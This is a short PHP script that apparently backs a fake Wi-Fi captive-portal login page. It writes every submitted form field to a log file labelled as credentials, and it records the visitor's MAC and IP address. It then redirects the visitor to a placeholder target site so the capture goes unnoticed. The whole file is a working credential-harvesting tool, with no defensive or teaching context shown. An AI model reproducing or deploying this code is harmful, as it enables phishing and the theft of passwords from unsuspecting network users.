<?php

// the name of the file you're writing to
$myFile = "auth.log";

// opens the file for appending (file must already exist)
$fh = fopen($myFile, 'a');

// record the initial form submission
$pre = "----------------------------------------\n";
$date = date ("d/m/Y -- H:i:s");
$message = "[ * ]   $date   [ * ]\n";
$newline = "\n";

// Makes a CSV list of your post data
$creds = implode(", ", $_POST) . "\n";

// Write to the file
fwrite($fh, $pre);
fwrite($fh, "$message");
fwrite($fh, $creds);
fwrite($fh, $pre);
fwrite($fh, $newline);

// Close the file
fclose($fh);

$arp = "/usr/sbin/arp";

// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
 
// get the client IP address from the query string
//$ip = $_GET["ip"];
//$ip = getenv("HTTP_CLIENT_IP"); 
$ip = $_SERVER["REMOTE_ADDR"];

global $mac; // necessary to export $mac?

$accinfo = "MAC: $mac    IP: $ip\n";

if (!isset($mac)) { echo $error; 
} else { 
// Allow through the captive portal
//exec("sudo /sbin/iptables -t nat -I PREROUTING -m mac --mac-source $mac -j ACCEPT");
$fp = fopen("/tmp/ip/ip", "w"); // "w" to overwrite previous mac
fwrite($fp, $mac);
fclose($fp);
sleep (2);
echo $success; }

// Redirect the defined target location
header('Location: http://[TARGET-SITE]');
?>